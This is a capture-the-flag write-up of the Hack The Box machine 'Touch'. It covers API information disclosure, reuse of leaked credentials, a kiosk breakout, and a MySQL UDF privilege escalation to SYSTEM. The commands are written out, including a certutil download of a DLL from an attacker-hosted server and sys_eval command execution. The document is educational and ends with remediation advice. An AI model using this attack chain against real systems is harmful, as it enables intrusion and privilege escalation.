# 📦 Hack The Box: Touch

<div align="center">

<img src="https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge" />
<img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge" />
<img src="https://img.shields.io/badge/Points-20-orange?style=for-the-badge" />

<br/><br/>

<strong>Author:</strong> Fayozbek Iskandarov (@secfz)  
<strong>Date:</strong> October 04, 2026  
<strong>Rank:</strong> HTB Grandmaster

</div>

> ⚠️ **Disclaimer:** This write-up is for educational purposes only. All activities described were performed in an authorized and isolated Hack The Box laboratory environment.

---

## 📌 Machine Information

| Parameter | Value |
| :--- | :--- |
| **Machine Name** | Touch |
| **Operating System** | Windows 11 / Server 2025 |
| **Target IP** | `10.129.x.x` |
| **Attacker IP** | `10.10.x.x` |
| **Difficulty** | Easy |
| **Points** | 20 |
| **Attack Chain** | Information Disclosure → Kiosk Breakout → Hardcoded Credentials → MySQL UDF Privilege Escalation |

---

# 🔍 1. Reconnaissance

Initial enumeration was performed using `nmap` to identify open ports and running services:

~~~bash
nmap -p- -sV -sC -Pn 10.129.x.x
~~~

### Key Findings

| Port | Service | Description |
| :--- | :--- | :--- |
| `135` | RPC | Microsoft Windows RPC |
| `3389` | RDP | Microsoft Terminal Services |
| `5985` | WinRM | Microsoft HTTPAPI |
| `8443` | HTTPS | Custom DeviceHub Application |

The custom web application running on port `8443` became the primary attack vector.

---

# 🚪 2. Initial Foothold

## 2.1 Information Disclosure via API

Enumerating the web application revealed an unauthenticated `/api/status` endpoint that leaked sensitive device information:

~~~bash
curl -k https://10.129.x.x:8443/api/status
~~~

The endpoint returned:

~~~json
{
  "device": "Nexion DeviceHub DH-100",
  "serial": "NX-DH-2024-B7042",
  "firmware": "1.4.2",
  "status": "online",
  "uptime": 51116
}
~~~

The exposed serial number became useful for further authentication.

---

## 2.2 Admin Panel Access & Credential Harvesting

Navigating to:

~~~text
https://10.129.x.x:8443
~~~

presented a login panel.

The leaked serial number was accepted as the password:

~~~text
NX-DH-2024-B7042
~~~

After successfully authenticating to the DeviceHub dashboard, RDP credentials were exposed in plaintext:

~~~text
Username: KioskUser
Password: K!0sk2026#
~~~

---

# 🖥️ 2.3 Kiosk Breakout

Using the harvested credentials, an RDP session was established:

~~~bash
xfreerdp /u:KioskUser /p:'K!0sk2026#' /v:10.129.x.x /size:1280x800 /dynamic-resolution
~~~

The session initially launched into a restricted HTB Airways Kiosk application.

The kiosk could be escaped through a logic flaw in the application.

### Exploitation Chain

1. Opened the DeviceHub admin panel on port `8443` from inside the kiosk browser.
2. Navigated to **Settings**.
3. Powered off the virtual **Scanner** device.
4. Selected **Return to Kiosk**.
5. Because the scanner was offline, the kiosk application generated a Win32 error dialog.
6. The error message contained a clickable hyperlink.
7. Clicking the hyperlink opened an unrestricted Microsoft Edge browser.
8. Pressed `Ctrl + O` to open the **Open File** dialog.
9. Entered `cmd.exe` as the file path.
10. Pressed `Enter`, spawning a standard Command Prompt.

This provided unrestricted command-line access as `KioskUser`.

---

# 🚩 2.4 User Flag

The user flag was retrieved with:

~~~cmd
type C:\Users\KioskUser\Desktop\user.txt
~~~

---

# 👑 3. Privilege Escalation

## 3.1 Discovering Hardcoded Credentials

Further filesystem enumeration revealed a batch script in the `ProgramData` directory:

~~~cmd
type "C:\ProgramData\HTB Airways\refresh-dates.bat"
~~~

The script contained hardcoded MySQL credentials:

~~~text
Username: root
Password: HTB@irw4ys_DB!2026
~~~

These credentials provided access to the local MySQL instance.

---

## 3.2 Identifying the MySQL UDF Attack Vector

Further enumeration showed that the MySQL `8.0` service was running under:

~~~text
NT AUTHORITY\SYSTEM
~~~

The MySQL plugin directory was also writable by the `Authenticated Users` group:

~~~cmd
icacls C:\MySQL\lib\plugin\
~~~

This combination created a privilege-escalation path through a MySQL User-Defined Function (UDF).

Because the MySQL service was running as `SYSTEM`, an OS-level command executed through a malicious UDF would execute with SYSTEM privileges.

---

# 💥 3.3 Exploitation

## Step 1 — Host the UDF DLL

On the attacker machine:

~~~bash
cd /usr/share/metasploit-framework/data/exploits/mysql
python3 -m http.server 8000
~~~

---

## Step 2 — Download the DLL to the Target

From the Windows target:

~~~cmd
certutil -urlcache -f http://10.10.x.x:8000/lib_mysqludf_sys_64.dll C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
~~~

The DLL was written directly into the writable MySQL plugin directory.

---

## Step 3 — Connect to MySQL

Using the credentials discovered in `refresh-dates.bat`:

~~~cmd
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026
~~~

---

## Step 4 — Create the UDF

Inside the MySQL console:

~~~sql
DROP FUNCTION IF EXISTS sys_eval;

CREATE FUNCTION sys_eval
RETURNS STRING
SONAME 'lib_mysqludf_sys_64.dll';
~~~

The `sys_eval` function could now execute operating-system commands through MySQL.

---

# 🔑 3.4 SYSTEM Access & Root Flag

The execution context was verified using:

~~~sql
SELECT CONVERT(sys_eval('whoami') USING utf8mb4) AS account;
~~~

The result confirmed execution as:

~~~text
NT AUTHORITY\SYSTEM
~~~

With SYSTEM-level command execution, the root flag was retrieved:

~~~sql
SELECT CONVERT(sys_eval('type C:\Users\Administrator\Desktop\root.txt')USING utf8mb4) AS root_flag;
~~~

This completed the privilege escalation and provided the root flag.

---

# 🛡️ 4. Key Takeaways & Remediation

The attack chain demonstrates how several seemingly minor security issues can be combined into complete system compromise.

| Vulnerability | Impact | Remediation |
| :--- | :--- | :--- |
| **Information Disclosure** | Unauthenticated API exposed sensitive device information. | Require proper authentication and authorization for all sensitive API endpoints. |
| **Credential Reuse** | The leaked serial number could be reused as an authentication credential. | Never use predictable device information as passwords. Enforce strong, unique credentials. |
| **Plaintext Credentials** | RDP credentials were exposed through the web application. | Avoid displaying sensitive credentials in plaintext and use secure secret management. |
| **Kiosk Logic Flaw** | A Win32 error allowed escape from the restricted kiosk environment. | Properly isolate kiosk applications and restrict child-process execution. |
| **Hardcoded Credentials** | Database credentials were stored in a batch script. | Use secure credential storage and remove secrets from scripts. |
| **Weak File Permissions** | Authenticated users could write to the MySQL plugin directory. | Apply least privilege and restrict write access to service/plugin directories. |
| **MySQL Running as SYSTEM** | UDF execution resulted in OS-level SYSTEM privileges. | Run database services under dedicated low-privilege service accounts. |

---

# 🎯 5. Attack Chain Summary

~~~text
Unauthenticated API
        ↓
Serial Number Disclosure
        ↓
DeviceHub Authentication
        ↓
RDP Credentials Exposed
        ↓
RDP Access as KioskUser
        ↓
Kiosk Logic Flaw
        ↓
Command Prompt
        ↓
User Flag
        ↓
Hardcoded MySQL Credentials
        ↓
Writable MySQL Plugin Directory
        ↓
MySQL UDF
        ↓
NT AUTHORITY\SYSTEM
        ↓
Root Flag
~~~

---

# 🧠 Conclusion

The **Touch** machine demonstrates an important real-world security principle: a system does not necessarily need one critical vulnerability to be compromised.

In this case, multiple smaller weaknesses were chained together:

- Information disclosure
- Weak authentication
- Credential exposure
- Kiosk escape
- Hardcoded credentials
- Weak filesystem permissions
- A privileged MySQL service

Individually, these issues may appear limited. Combined, they resulted in complete compromise of the Windows host.

---

<div align="center">

<strong>Thanks to the Hack The Box community and the machine creator for the challenge.</strong>

<br/><br/>

🔗 <a href="https://github.com/secfz">GitHub</a>  
✈️ <a href="https://t.me/Secfz">Telegram</a>  
💼 <a href="https://www.linkedin.com/in/iskandarov-fayozbek">LinkedIn</a>

</div>
